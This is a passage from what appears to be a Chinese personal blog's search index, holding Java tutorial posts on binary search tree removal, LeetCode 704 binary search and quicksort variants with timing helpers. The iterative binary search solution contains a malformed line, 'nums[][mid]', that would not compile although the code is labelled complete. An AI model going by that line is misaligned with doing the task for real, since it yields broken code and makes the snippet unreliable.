class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        root = remove(root , e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除以node为根的二分搜索树中值为e的节点，递归算法</span></span><br><span class="line">    <span class="comment">// 返回删除节点后新的二分搜索树的根</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Node <span class="title">remove</span><span class="params">(Node node, E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(e.compareTo(node.e) &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            node.left = remove(node.left, e);</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(e.compareTo(node.e) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            node.right = remove(node.right, e);</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123; <span class="comment">// e == node.e</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(node.left == <span class="keyword">null</span>)&#123;</span><br><span class="line">                Node rightNode = node.right;</span><br><span class="line">                node.right = <span class="keyword">null</span>;</span><br><span class="line">                size --;</span><br><span class="line">                <span class="keyword">return</span> rightNode;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(node.right == <span class="keyword">null</span>)&#123;</span><br><span class="line">                Node leftNode = node.left;</span><br><span class="line">                node.left = <span class="keyword">null</span>;</span><br><span class="line">                size --;</span><br><span class="line">                <span class="keyword">return</span> leftNode;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 待删除节点左右子树均不为空的情况</span></span><br><span class="line">            <span class="comment">// 找到比待删除节点大的最小节点，即删除节点右子树的最小节点</span></span><br><span class="line">            <span class="comment">// 用这个节点顶替待删除节点的位置</span></span><br><span class="line">            Node successor = minimum(node.right);</span><br><span class="line">            successor.right = removeMin(node.right);</span><br><span class="line">            successor.left = node.left;</span><br><span class="line"></span><br><span class="line">            node.left = node.right = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> successor;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Main-java-测试用例"><a href="#Main-java-测试用例" class="headerlink" title="Main.java(测试用例)"></a>Main.java(测试用例)</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        BST&lt;Integer&gt; bst = <span class="keyword">new</span> BST&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">1000</span>;</span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n ; i ++)</span><br><span class="line">            bst.add(random.nextInt(<span class="number">10000</span>));</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Integer&gt; nums = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span>(!bst.isEmpty())</span><br><span class="line">            nums.add(bst.removeMax());</span><br><span class="line"></span><br><span class="line">        System.out.println(nums);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span> ; i &lt; nums.size() ; i ++)</span><br><span class="line">            <span class="keyword">if</span>(nums.get(i-<span class="number">1</span>) &lt; nums.get(i))</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Error"</span>);</span><br><span class="line">            System.out.println(<span class="string">"RemoveMax test completed"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        bst.preOrder();</span></span><br><span class="line"><span class="comment">//        System.out.println();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        bst.preOrderNR();</span></span><br><span class="line"><span class="comment">//        bst.levelOrder();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        bst.inOrder();</span></span><br><span class="line"><span class="comment">//        System.out.println();</span></span><br><span class="line"><span class="comment">//        bst.postOrder();</span></span><br><span class="line"><span class="comment">//        System.out.println();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        System.out.println(bst);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>二分搜索树</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】LeetCode题答-704二分查找</title>
    <url>/posts/46.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="LeetCood题目"><a href="#LeetCood题目" class="headerlink" title="LeetCood题目"></a>LeetCood题目</h1><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://gylq.gitee.io/cloudimages/img/image-20210630045728618.png" alt="image-20210630045728618"></h2><h1 id="题答1（递归解法完整代码）"><a href="#题答1（递归解法完整代码）" class="headerlink" title="题答1（递归解法完整代码）"></a>题答1（递归解法完整代码）</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//704</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> search(nums ,<span class="number">0</span>, nums.length-<span class="number">1</span>, target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span>[] data, <span class="keyword">int</span> l , <span class="keyword">int</span> r, <span class="keyword">int</span> target)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(l &gt; r) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(data[mid] == target)</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        <span class="keyword">if</span>(data[mid] &lt; target )</span><br><span class="line">            <span class="keyword">return</span> search(data, mid + <span class="number">1</span>, r, target);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> search(data, l, mid - <span class="number">1</span> , target);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="题答2（非递归解法完整代码）"><a href="#题答2（非递归解法完整代码）" class="headerlink" title="题答2（非递归解法完整代码）"></a>题答2（非递归解法完整代码）</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//704</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>, r = nums.length - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在data[l, r ]范围中查找 target</span></span><br><span class="line">        <span class="keyword">while</span>(l &lt;= r)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = l + (r - l ) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[][mid] == target)</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &lt; target)</span><br><span class="line">                l = mid + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                r = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="测试截图"><a href="#测试截图" class="headerlink" title="测试截图"></a>测试截图</h1><h2 id="题答1"><a href="#题答1" class="headerlink" title="题答1"></a>题答1</h2><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210630045847788.png" alt="image-20210630045847788"></p>
<h2 id="题答2"><a href="#题答2" class="headerlink" title="题答2"></a>题答2</h2><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210630051214790.png" alt="image-20210630051214790"></p>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-快速排序（完整代码）</title>
    <url>/posts/48.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="快速排序执行耗时结果截图"><a href="#快速排序执行耗时结果截图" class="headerlink" title="快速排序执行耗时结果截图"></a>快速排序执行耗时结果截图</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210630045234675.png" alt="image-20210630045234675"></p>
<h1 id="快速排序执行（完整代码）"><a href="#快速排序执行（完整代码）" class="headerlink" title="快速排序执行（完整代码）"></a>快速排序执行（完整代码）</h1><h2 id="QuickSort-java（进行了三层优化之后的算法时间进行比较）"><a href="#QuickSort-java（进行了三层优化之后的算法时间进行比较）" class="headerlink" title="QuickSort.java（进行了三层优化之后的算法时间进行比较）"></a>QuickSort.java（进行了三层优化之后的算法时间进行比较）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QuickSort</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">QuickSort</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(E[] arr)</span></span>&#123;</span><br><span class="line">        Random rnd = <span class="keyword">new</span> Random();</span><br><span class="line">        sort(arr, <span class="number">0</span>, arr.length-<span class="number">1</span>, rnd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(E[] arr, <span class="keyword">int</span> l , <span class="keyword">int</span> r, Random rnd)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> p = partition(arr, l , r, rnd);</span><br><span class="line">        sort(arr, l, p-<span class="number">1</span>, rnd);</span><br><span class="line">        sort(arr, p+<span class="number">1</span> , r, rnd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">int</span> <span class="title">partition</span><span class="params">(E[] arr, <span class="keyword">int</span> l, <span class="keyword">int</span> r, Random rnd)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//生成[l,r]之间的随机索引</span></span><br><span class="line">        <span class="keyword">int</span> p = l + rnd.nextInt(r-l+<span class="number">1</span>);</span><br><span class="line">        swap(arr, l , p);</span><br><span class="line">        <span class="comment">// arr[l+1...j] &lt; v; arr[j+1...i] &gt;v</span></span><br><span class="line">        <span class="keyword">int</span> j=l;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = l + <span class="number">1</span>; i&lt;= r; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[i].compareTo(arr[l]) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                j ++;</span><br><span class="line">                swap(arr, j, i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        swap(arr, l,j);</span><br><span class="line">        <span class="keyword">return</span> j;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort2ways</span><span class="params">(E[] arr)</span></span>&#123;</span><br><span class="line">        Random rnd = <span class="keyword">new</span> Random();</span><br><span class="line">        sort2ways(arr, <span class="number">0</span>, arr.length-<span class="number">1</span>, rnd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort2ways</span><span class="params">(E[] arr, <span class="keyword">int</span> l , <span class="keyword">int</span> r, Random rnd)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> p = partition2(arr, l , r, rnd);</span><br><span class="line">        sort2ways(arr, l, p-<span class="number">1</span>, rnd);</span><br><span class="line">        sort2ways(arr, p+<span class="number">1</span> , r, rnd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">int</span> <span class="title">partition2</span><span class="params">(E[] arr, <span class="keyword">int</span> l, <span class="keyword">int</span> r, Random rnd)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//生成[l,r]之间的随机索引</span></span><br><span class="line">        <span class="keyword">int</span> p = l + rnd.nextInt(r-l+<span class="number">1</span>);</span><br><span class="line">        swap(arr, l , p);</span><br><span class="line">        <span class="comment">// arr[l+1...j] &lt; v; arr[j+1...i] &gt;v</span></span><br><span class="line"><span class="comment">//        int j=l;</span></span><br><span class="line"><span class="comment">//        for(int i = l + 1; i&lt;= r; i++)&#123;</span></span><br><span class="line"><span class="comment">//            if(arr[i].compareTo(arr[l]) &lt; 0)&#123;</span></span><br><span class="line"><span class="comment">//                j ++;</span></span><br><span class="line"><span class="comment">//                swap(arr, j, i);</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        swap(arr, l,j);</span></span><br><span class="line"><span class="comment">//        return j;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// arr[l+1...i-1] &lt;= v; arr[j+1...r] &gt;= v</span></span><br><span class="line">        <span class="keyword">int</span> i = l+<span class="number">1</span> , j = r;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(i &lt;= j &amp;&amp; arr[i].compareTo(arr[l]) &lt; <span class="number">0</span>)</span><br><span class="line">                i ++;</span><br><span class="line">            <span class="keyword">while</span>(j &gt;= i &amp;&amp; arr[j].compareTo(arr[l]) &gt; <span class="number">0</span>)</span><br><span class="line">                j --;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(i &gt;= j) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            swap(arr, i , j);</span><br><span class="line">            i ++;</span><br><span class="line">            j --;</span><br><span class="line">        &#125;</span><br><span class="line">        swap(arr, l , j);</span><br><span class="line">        <span class="keyword">return</span> j;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort3ways</span><span class="params">(E[] arr)</span></span>&#123;</span><br><span class="line">        Random rnd = <span class="keyword">new</span> Random();</span><br><span class="line">        sort3ways(arr, <span class="number">0</span>, arr.length-<span class="number">1</span>, rnd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort3ways</span><span class="params">(E[] arr, <span class="keyword">int</span> l , <span class="keyword">int</span> r, Random rnd)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//生成[l,r]之间的随机索引</span></span><br><span class="line">        <span class="keyword">int</span> p = l + rnd.nextInt(r-l+<span class="number">1</span>);</span><br><span class="line">        swap(arr, l , p);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// arr[l + 1, lt] &lt; v, arr[lt + 1, i - 1] == v , arr[gt, r] &gt; v</span></span><br><span class="line">        <span class="keyword">int</span> lt = l , i = l + <span class="number">1</span>, gt = r + <span class="number">1</span>; <span class="comment">//初始空区间</span></span><br><span class="line">        <span class="keyword">while</span>(i &lt; gt)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(arr[i].compareTo(arr[l])&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                lt ++;</span><br><span class="line">                swap(arr, i , lt );</span><br><span class="line">                i ++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(arr[i].compareTo(arr[l])&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                gt --;</span><br><span class="line">                swap(arr, i, gt);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123; <span class="comment">// arr[i] == arr[l]</span></span><br><span class="line">                i ++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        swap(arr,l ,lt);</span><br><span class="line">        <span class="comment">// arr[l, lt - 1 ] &lt; v, arr[lt , gt - 1] == v, arr[gt, r ] &gt; v</span></span><br><span class="line">        sort3ways(arr, l , lt-<span class="number">1</span>, rnd);</span><br><span class="line">        sort3ways(arr, gt , r, rnd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;E&gt; <span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(E[] arr, <span class="keyword">int</span> i , <span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        E t = arr[i];</span><br><span class="line">        arr[i] = arr[j];</span><br><span class="line">        arr[j] = t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">10000000</span>;</span><br><span class="line">        Integer[] arr = ArrayGenerator.generateRandomArray(n,n);</span><br><span class="line">        Integer[] arr2 = Arrays.copyOf(arr, arr.length);</span><br><span class="line"></span><br><span class="line">        SortingHelper.sortTest(<span class="string">"QuickSort"</span>, arr);</span><br><span class="line">        SortingHelper.sortTest(<span class="string">"QuickSort2"</span>, arr2);</span><br><span class="line"></span><br><span class="line">        arr = ArrayGenerator.generateOrderedArray(n);</span><br><span class="line">        arr2 = Arrays.copyOf(arr, arr.length);</span><br><span class="line"></span><br><span class="line">        SortingHelper.sortTest(<span class="string">"QuickSort"</span>, arr);</span><br><span class="line">        SortingHelper.sortTest(<span class="string">"QuickSort2"</span>, arr2);</span><br><span class="line"></span><br><span class="line">        arr = ArrayGenerator.generateRandomArray(n, <span class="number">1</span>);</span><br><span class="line">        arr2 = Arrays.copyOf(arr, arr.length);</span><br><span class="line">        Integer[] arr3 = Arrays.copyOf(arr, arr.length);</span><br><span class="line">        SortingHelper.sortTest(<span class="string">"QuickSort2"</span>, arr2);</span><br><span class="line">        SortingHelper.sortTest(<span class="string">"QuickSort3"</span>, arr3);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="ArrayGenerator-java-生成随机n个元素的数组"><a href="#ArrayGenerator-java-生成随机n个元素的数组" class="headerlink" title="ArrayGenerator.java(生成随机n个元素的数组)"></a>ArrayGenerator.java(生成随机n个元素的数组)</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayGenerator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">ArrayGenerator</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Integer[] generateOrderedArray(<span class="keyword">int</span> n)&#123;</span><br><span class="line"></span><br><span class="line">       Integer[] arr = <span class="keyword">new</span> Integer[n];</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n ; i++)</span><br><span class="line">           arr[i] = i;</span><br><span class="line">       <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 生成一个长度为 n 的随机数组， 每个数字的范围是[ 0 , bound)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Integer[] generateRandomArray(<span class="keyword">int</span> n, <span class="keyword">int</span> bound)&#123;</span><br><span class="line"></span><br><span class="line">        Integer[] arr = <span class="keyword">new</span> Integer[n];</span><br><span class="line">        Random rnd = <span class="keyword">new</span> Random();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n; i++)</span><br><span class="line">            arr[i] = rnd.nextInt(bound); <span class="comment">//从0到bound前闭后开</span></span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="SortingHelper-java（辅助进行算法时间输出的）"><a href="#SortingHelper-java（辅助进行算法时间输出的）" class="headerlink" title="SortingHelper.java（辅助进行算法时间输出的）"></a>SortingHelper.java（辅助进行算法时间输出的）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public class SortingHelper &#123;</span><br><span class="line"></span><br><span class="line">    private SortingHelper()&#123;&#125; &#x2F;&#x2F;私有类</span><br><span class="line"></span><br><span class="line">    public static &lt;E extends Comparable&lt;E&gt;&gt; boolean isSorted(E[] arr)&#123;</span><br><span class="line"></span><br><span class="line">        for(int i &#x3D; 1; i&lt; arr.length; i++)</span><br><span class="line">            if (arr[i - 1].compareTo(arr[i]) &gt; 0)</span><br><span class="line">            return false;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static &lt;E extends Comparable&lt;E&gt;&gt; void sortTest(String sortname, E[] arr)&#123;</span><br><span class="line">        long startTime &#x3D; System.nanoTime();</span><br><span class="line">        if(sortname.equals(&quot;SelectionSort&quot;)) &#123;</span><br><span class="line">            SelectionSort.sort(arr);</span><br><span class="line">        &#125; else if(sortname.equals(&quot;InsertionSort&quot;))</span><br><span class="line">            InsertionSort.sort(arr);</span><br><span class="line">        else if(sortname.equals(&quot;InsertionSort2&quot;))</span><br><span class="line">            InsertionSort.sort2(arr);</span><br><span class="line">        else if(sortname.equals(&quot;MergeSort&quot;))</span><br><span class="line">            MergeSort.sort(arr);</span><br><span class="line">        else if(sortname.equals(&quot;MergeSort2&quot;))</span><br><span class="line">            MergeSort.sort2(arr);</span><br><span class="line">        else if(sortname.equals(&quot;MergeSort3&quot;))</span><br><span class="line">            MergeSort.sort3(arr);</span><br><span class="line">        else if(sortname.equals(&quot;MergeSort4&quot;))</span><br><span class="line">            MergeSort.sort4(arr);</span><br><span class="line">        else if(sortname.equals(&quot;MergeSortBU&quot;))</span><br><span class="line">            MergeSort.sortBU(arr);</span><br><span class="line">        else if(sortname.equals(&quot;QuickSort&quot;))</span><br><span class="line">            QuickSort.sort(arr);</span><br><span class="line">        else if(sortname.equals(&quot;QuickSort2&quot;))</span><br><span class="line">            QuickSort.sort2ways(arr);</span><br><span class="line">        else if(sortname.equals(&quot;QuickSort3&quot;))</span><br><span class="line">            QuickSort.sort3ways(arr);</span><br><span class="line">        long endTime &#x3D; System.nanoTime();</span><br><span class="line"></span><br><span class="line">        double time &#x3D; (endTime - startTime) &#x2F; 1000000000.0; &#x2F;&#x2F;纳米要&#x2F;9个零</span><br><span class="line"></span><br><span class="line">        if(!SortingHelper.isSorted(arr))</span><br><span class="line">            throw new RuntimeException(sortname + &quot;failed&quot;);</span><br><span class="line">        System.out.println(String.format(&quot;%s , n &#x3D; %d : %f s &quot;, sortname, arr.length, time));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>快速排序</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-归并排序（完整代码）</title>
    <url>/posts/45.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="归并排序执行结果截图"><a href="#归并排序执行结果截图" class="headerlink" title="归并排序执行结果截图"></a>归并排序执行结果截图</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210627222351301.png" alt="image-20210627222351301"></p>
